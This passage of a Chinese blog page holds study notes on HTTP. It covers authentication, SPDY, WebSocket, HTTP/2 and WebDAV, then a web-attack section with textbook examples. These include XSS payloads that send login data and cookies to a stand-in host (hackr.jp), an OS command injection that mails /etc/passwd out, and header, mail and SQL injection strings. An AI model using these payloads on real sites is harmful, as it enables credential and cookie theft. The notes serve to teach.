<p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理，不需要任何附加信息即可对其解码。如果被人窃听，被盗的可能性极高。</p>
</li>
<li><p>DIGEST 认证（摘要认证）：</p>
<ol>
<li>和 BASIC 认证一样，<strong>WWW-Authenticate</strong> 字段内包含质问响应方式认证所需的临时质询码（随机数， nonce）和 realm。</li>
<li>接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。必须包含 username、realm、nonce、uri 和 response 的字段信息。</li>
<li>接收到包含首部字段 <strong>Authorization</strong> 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI 资源的响应。并且这时会在首部字段 <strong>Authentication-Info</strong> 写入一些认证成功的相关信息。</li>
</ol>
</li>
<li><p>SSL 客户端认证</p>
<ol>
<li>接收到需要认证资源的请求，服务器会发送 <code>Certificate Request</code> 报文，要求客户端提供客户端证书。</li>
<li>用户选择将发送的客户端证书后，客户端会把客户端证书信息以 <code>Client Certificate</code> 报文方式发送给服务器。</li>
<li>服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</li>
</ol>
</li>
<li><p>FormBase 认证（基于表单认证）</p>
<p>基于表单的认证方法并不是在 HTTP 协议中定义的，客户端会向服务器上的 Web 应用程序发送登录信息(Credential)，按登录信息的验证结果认证。（也就是常见的输入账号密码登录）</p>
<p>基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理 Session（会话），以弥补 HTTP 协议中不存在的状态管理功能。具体流程如下：</p>
<ol>
<li>客户端把用户 ID 和密码等登录信息放入报文的实体部分， 通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS 通信来进行 HTML 表单画面的显示和用户输入数据的发送。</li>
<li>服务器会发放用以识别用户的 Session ID，并通过首部字段 <strong>Set-Cookie</strong> 告知客户端写入 Cookie。</li>
<li>客户端在下次向服务器发送请求时会自动带上 Cookie 中的 Session ID，服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。</li>
</ol>
</li>
</ul>
<h3 id="HTTP-的功能追加协议"><a href="#HTTP-的功能追加协议" class="headerlink" title="HTTP 的功能追加协议"></a>HTTP 的功能追加协议</h3><ol>
<li><p><strong>SPDY</strong></p>
<ul>
<li>频繁的进行 HTTP 请求会有以下瓶颈：<ul>
<li>一条连接上只可发送一个请求。</li>
<li>请求只能从客户端开始。客户端不可以接收除响应以外的指令。</li>
<li>请求 <strong>/</strong> 响应首部未经压缩就发送。首部信息越多延迟越大。</li>
<li>发送冗长的首部。每次互相发送相同的首部造成的浪费较多。</li>
<li>可任意选择数据压缩格式。非强制压缩发送。</li>
</ul>
</li>
<li>基于 HTTP 的解决方案：<ul>
<li>Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。然而，利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。</li>
<li>Comet 的解决方法：一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客 户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端 推送(Server Push)的功能。内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet 也仍未解决 HTTP 协议本身存在的问题。</li>
</ul>
</li>
<li>SPDY 在协议级别消除 HTTP 的瓶颈，没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与传输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。使用 SPDY 后，HTTP 协议额外获得以下功能：<ul>
<li><strong>多路复用流</strong>，通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。</li>
<li><strong>赋予请求优先级</strong>，解决因带宽低而导致响应变慢的问题。</li>
<li><strong>压缩 HTTP 首部</strong>，减少数据包数量和发送的字节数。</li>
<li><strong>推送功能</strong>，服务器主动向客户端推送数据。</li>
<li><strong>服务器提示功能</strong>，服务器可以主动提示客户端请求所需的资源，在资源已缓存时可以避免发送不必要请求。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>WebSocket</strong> 全双工通信</p>
<ul>
<li><p>WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送 JSON、XML、HTML 或图片等任意格式的数据。WebSocket 协议的主要特点：</p>
<ul>
<li><strong>推送功能</strong>，支持由服务器向客户端推送数据的功能。</li>
<li><strong>减少通信量</strong>，和 HTTP 相比，不但每次连接时的总开销减少，首部信息很小所以通信量也相应减少了。</li>
</ul>
</li>
<li><p>为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”的步骤。</p>
<ul>
<li><p>握手 · 请求</p>
<p>为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变，以达到握手的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: server.example.com</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ&#x3D;&#x3D; </span><br><span class="line">Origin: http:&#x2F;&#x2F;example.com </span><br><span class="line">Sec-WebSocket-Protocol: chat, superchat </span><br><span class="line">Sec-WebSocket-Version: 13</span><br></pre></td></tr></table></figure>

<p><strong>Sec-WebSocket-Key</strong> 字段内记录着握手过程中必不可少的键值。</p>
<p><strong>Sec-WebSocket-Protocol</strong> 字段内记录使用的子协议。</p>
</li>
<li><p>握手 · 响应</p>
<p>对于之前的请求，返回状态码 <strong>101 Switching Protocols</strong> 的响应。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo&#x3D; </span><br><span class="line">Sec-WebSocket-Protocol: chat</span><br></pre></td></tr></table></figure>

<p><strong>Sec-WebSocket-Accept</strong> 的字段值是由握手请求中的 <strong>Sec-WebSocket-Key</strong> 的字段值生成的。</p>
<p>成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。</p>
</li>
</ul>
</li>
<li><p><strong>WebSocket API</strong></p>
<p>JavaScript 可调用由 W3C 标准制定的 <a href="http://www.w3.org/TR/websockets/" target="_blank" rel="noopener">The WebSocket API</a> 内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">'ws://game.example.com:12010/updates'</span>);</span><br><span class="line">socket.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  	<span class="keyword">if</span> (socket.bufferedAmount == <span class="number">0</span>)</span><br><span class="line">  		socket.send(getUpdateData()); </span><br><span class="line">  &#125;, <span class="number">50</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>HTTP/2.0</strong></p>
<ul>
<li><p>HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验，通过以下协议为基础实现：</p>
<ul>
<li><strong>SPDY</strong></li>
<li><strong>HTTP Speed</strong> + <strong>Mobility</strong> 由微软公司起草，是用于改善并提高移动端通信时的通信速度和性能的标准，建立在 Google 公司提出的 SPDY 与 WebSocket 的基础之上。</li>
<li><strong>Network-Friendly HTTP Upgrade</strong> 主要是在移动端通信时改善 HTTP 性能的标准。</li>
</ul>
</li>
<li><p>HTTP/2.0 的 7 项技术及其讨论</p>
<table>
<thead>
<tr>
<th>技术</th>
<th>基础协议</th>
</tr>
</thead>
<tbody><tr>
<td>压缩</td>
<td>SPDY、Friendly</td>
</tr>
<tr>
<td>多路复用</td>
<td>SPDY</td>
</tr>
<tr>
<td>TLS 义务化</td>
<td>Speed + Mobility</td>
</tr>
<tr>
<td>协商</td>
<td>Speed + Mobility、Friendly</td>
</tr>
<tr>
<td>客户端拉拽/服务器推送</td>
<td>Speed + Mobility</td>
</tr>
<tr>
<td>流量控制</td>
<td>SPDY</td>
</tr>
<tr>
<td>WebSocket</td>
<td>Speed + Mobility</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ol>
<ol start="4">
<li><p><strong>WebDAV</strong> Web 服务器文件管理</p>
<ul>
<li><p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网 的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进 行文件复制、编辑等操作的分布式文件系统。</p>
</li>
<li><p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编 辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的 版本控制功能。</p>
</li>
<li><p>针对服务器上的资源，WebDAV 新增加了一些概念：</p>
<ul>
<li>集合(<strong>Collection</strong>)：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</li>
<li>资源(<strong>Resource</strong>)：把文件或集合称为资源。 </li>
<li>属性(<strong>Property</strong>)：定义资源的属性。定义以<strong>“</strong>名称 <strong>=</strong> 值<strong>”</strong>的格式执行。</li>
<li>锁(<strong>Lock</strong>)：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</li>
</ul>
</li>
<li><p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。</p>
<ul>
<li><strong>PROPFIND</strong> ：获取属性</li>
<li><strong>PROPPATCH</strong> ：修改属性</li>
<li><strong>MKCOL</strong> ：创建集合</li>
<li><strong>COPY</strong> ：复制资源及属性</li>
<li><strong>MOVE</strong> ：移动资源</li>
<li><strong>LOCK</strong> ：资源加锁</li>
<li><strong>UNLOCK</strong> ：资源解锁</li>
</ul>
</li>
<li><p>为配合扩展的方法，状态码也随之扩展。</p>
<ul>
<li><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</li>
<li><strong>207 Multi-Status</strong> ：存在多种状态</li>
<li><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误</li>
<li><strong>423 Locked</strong> ：资源已被加锁</li>
<li><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</li>
<li><strong>507 Insufficient Storage</strong> ：保存空间不足</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="构建-Web-内容的技术"><a href="#构建-Web-内容的技术" class="headerlink" title="构建 Web 内容的技术"></a>构建 Web 内容的技术</h3><ol>
<li><strong>HTML</strong> 是为了发送 Web 上的超文本 (Hypertext) 而开发的标记语言。<ul>
<li>HTML5 标准不仅解决了浏览器之间的兼容性问题，并且可把文本作为数据对待，更容易复用，动画等效果也变得更生动。</li>
<li>CSS 可以指定如何展现 HTML 内的各种元素，属于样式表标准之一。</li>
</ul>
</li>
<li><strong>动态 HTML</strong> 是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。<ul>
<li>DOM 是用以操作 HTML 文档和 XML 文档的 API(Application Programming Interface，应用编程接口)。</li>
<li>通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML 的改变。</li>
</ul>
</li>
<li><strong>Web 应用</strong> 是指通过 Web 功能提供的应用程序。<ul>
<li>其作用于由程序创建的动态内容之上。</li>
<li>CGI (Common Gateway Interface，通用网关接口) 是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。每次接到请求都要跟着启动一次，一旦访问量过大，Web 服务器要承担相当大的负载。</li>
<li>Servlet 是一种能在服务器上创建动态内容的程序，常驻内存，执行效率高，解决 CGI 问题。</li>
</ul>
</li>
<li>数据发布的格式及语言<ul>
<li>XML (eXtensible Markup Language，可扩展标记语言) 是一种可按应用目标进行扩展的通用标记语言。</li>
<li>RSS (简易信息聚合，也叫聚合内容) 和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。</li>
<li>JSON (JavaScript Object Notation) 是一种以 JavaScript (ECMAScript) 的对象表示法为基础的轻量级数据标记语 言。</li>
</ul>
</li>
</ol>
<h3 id="Web-攻击技术"><a href="#Web-攻击技术" class="headerlink" title="Web 攻击技术"></a>Web 攻击技术</h3><ol>
<li><p><strong>针对 Web 的攻击技术</strong></p>
<ul>
<li><p>在 HTTP 请求报文内加载攻击代码，就能发起对 Web 应用的攻击，通过 URL 查询字段或表单、HTTP 首部、Cookie 等途径把攻击代码传入。针对 Web 应用的攻击模式：</p>
<ul>
<li>主动攻击，是指攻击者通过直接访问 Web 应用， 把攻击代码传入的攻击模式。有代表性的攻击是 SQL 注入攻击和 OS 命令注 入攻击。</li>
<li>被动攻击，是指利用圈套策略执行攻击代码的攻击模式，步骤如下：<ol>
<li>攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。</li>
<li>当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。</li>
<li>中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。</li>
<li>执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。</li>
</ol>
</li>
</ul>
</li>
<li><p>利用被动攻击，可发起对原本从互联网上无法直接访问的企业内网等网络的攻击。</p>
</li>
</ul>
</li>
<li><p><strong>因输出值转义不完全引发的安全漏洞</strong></p>
<ul>
<li><p>实施 Web 应用的安全对策可大致分为以下两部分：</p>
<ul>
<li>客户端的验证</li>
<li>Web 应用端（服务器端）的验证<ul>
<li>输入值验证</li>
<li>输出值转义</li>
</ul>
</li>
</ul>
<p>多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范 对策。</p>
<p>从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。</p>
</li>
<li><p>跨站脚本攻击</p>
<p>跨站脚本攻击 (Cross-Site Scripting，XSS) 是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。跨站脚本攻击有可能造成以下影响：</p>
<ul>
<li>利用虚假输入表单骗取用户个人信息。</li>
<li>利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下， 帮助攻击者发送恶意请求。</li>
<li>显示伪造的文章或图片。</li>
</ul>
<p>示例1：（输入个人信息后发送到攻击者的网站）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID="&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+f=<span class="built_in">document</span>.getElementById(<span class="string">"login"</span>);+f.action=<span class="string">"http://hackr.jp/pwget"</span>;+f.method=<span class="string">"get"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">span+s="</span></span></span><br></pre></td></tr></table></figure>

<p>示例2：（获取该 Web 应用所处域名下的 Cookie 信息）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://hackr.jp/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xss.js</span></span><br><span class="line"><span class="keyword">var</span> content = <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie); </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&lt;img src=http://hackr.jp/?"</span>); </span><br><span class="line"><span class="built_in">document</span>.write(content);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">"&gt;"</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL 注入攻击</p>
<ul>
<li><p>SQL 注入(SQL Injection)是指针对 Web 应用使用的数据库，通 过运行非法的 SQL 而产生的攻击。</p>
</li>
<li><p>示例：</p>
<p>地址栏的某参数会作为搜索功能的关键字，在该参数后加上<code>&#39;--&#39;</code>，会把后面的条件全视为注释。</p>
</li>
</ul>
</li>
<li><p>OS 命令注入攻击</p>
<ul>
<li><p>通过 Web 应用，执行非法的操作系统命令达到攻击的目的。</p>
</li>
<li><p>示例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表单中的核心代码，调用 sendmail 命令发送邮件，地址为 &amp;adr</span></span><br><span class="line">my $adr = $q-&gt;param(<span class="string">'mailaddress'</span>); </span><br><span class="line">open(MAIL, <span class="string">"| /usr/sbin/sendmail $adr"</span>); </span><br><span class="line">print MAIL <span class="string">"From: info@example.com\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 攻击者将地址指定为以下值</span></span><br><span class="line">; cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>HTTP 首部注入攻击</p>
<ul>
<li><p>攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击。属于被动攻击模式。</p>
</li>
<li><p>示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 选择类别后，通过类别 ID 反映在响应内的 Location 首部字段内。类别后加上：</span><br><span class="line">101%0D%0ASet-Cookie:+SID=123456789</span><br></pre></td></tr></table></figure>

<p>其中 %0D%0A 代表 HTTP 报文中的换行符，攻击者可以修改任意的 Cookie 信息。</p>
</li>
<li><p>HTTP 响应截断攻击是用在 HTTP 首部注入的一种攻击。攻击顺序相同，但是要将两个 %0D%0A%0D%0A 并排插入字符串后发送。利用这两个连续的换行就可作出 HTTP 首部与主体分隔所需的空行了，这样就能显示伪造的主体，达到攻击目的。</p>
</li>
</ul>
</li>
<li><p>邮件首部注入攻击</p>
<ul>
<li><p>%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的 Web 应用接收了这个换行符，就可能实现对 BCC(Blind Carbon Copy) 邮件地址的追加发送：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0ABcc: user@example.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>另外像下面一样，使用两个连续的换行符就有可能篡改邮件文本 内容并发送。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bob@hackr.jp%0D%0A%0D%0ATest Message</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>目录遍历攻击</p>
<ul>
<li>是指对本无意公开的文件目录， 通过非法截断其目录路径后，达成访问目的的一种攻击。</li>
<li>可使用 …/ 等相对路径定位到 /etc/passed 等绝对路径上。</li>
</ul>
</li>
<li><p>远程文件包含漏洞</p>
<ul>
<li>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的 URL 充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。</li>
<li>主要是 PHP 存在的安全漏洞，对 PHP 的 include 或 require 来说， 这是一种可通过设定，指定外部服务器的 URL 作为文件名的功能。外部文件可以通过 system 函数执行 OS 命令。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>因设置或设计上的缺陷引发的安全漏洞</strong></p>
<ul>
<li>强制浏览安全漏洞，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</li>
<li>不正确的错误消息处理，是指Web 应用的错误信息内包含对攻击者有用的信息。</li>
<li>开放重定向，是一种对指定的任意 URL 作重定向跳转的功能。</li>
</ul>
</li>
<li><p><strong>因会话管理疏忽引发的安全漏洞</strong></p>
<ul>
<li>会话劫持，是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</li>
<li>会话固定攻击，强制用户使用攻击者指定的会话 ID。</li>
<li>跨站点请求伪造，是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</li>
</ul>
</li>
<li><p><strong>其他安全漏洞</strong></p>
<ul>
<li><p>密码破解攻击，即算出密码，突破认证。包括：</p>
<ul>
<li>通过网络的密码试错：<ul>
<li>穷举法。</li>
<li>字典攻击，事先收集好候选密码来尝试通过验证。</li>
</ul>
</li>
<li>对已加密密码的破解：<ul>
<li>通过穷举法<strong>·</strong>字典攻击进行类推</li>
<li>彩虹表，由明文密码及与之对应的散列值构成 的一张数据库表</li>
<li>拿到密钥，共享密钥加密方式</li>
<li>加密算法的漏洞</li>
</ul>
</li>
</ul>
</li>
<li><p>点击劫持，利用透明的按钮或链接做成陷阱，覆盖在 Web 页面之上。</p>
</li>
<li><p>DoS 攻击，是一种让运行中的服务呈停止状态的攻击，主要有以下两种：</p>
<ul>
<li>集中利用访问请求造成资源过载</li>
<li>通过攻击安全漏洞使服务停止</li>
</ul>
<p>多台计算机发起的 DoS 攻击称为 DDoS 攻击 (Distributed Denial of Service attack)。DDoS 攻击通常利用那些感染病毒的计算机作为攻 击者的攻击跳板。</p>
</li>
<li><p>后门程序，指开发设置的隐藏入口，可不按正常步骤使用受限功能。</p>
</li>
</ul>
</li>
</ol>
</div></article></div></main><footer><div class="paginator"><a href="/2019/11/14/%E5%9B%BE%E8%A7%A3%20TCP:IP/" class="next">NEXT</a></div><div class="copyright"><p>© 2020 <a href="http://yoursite.com">senyu</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>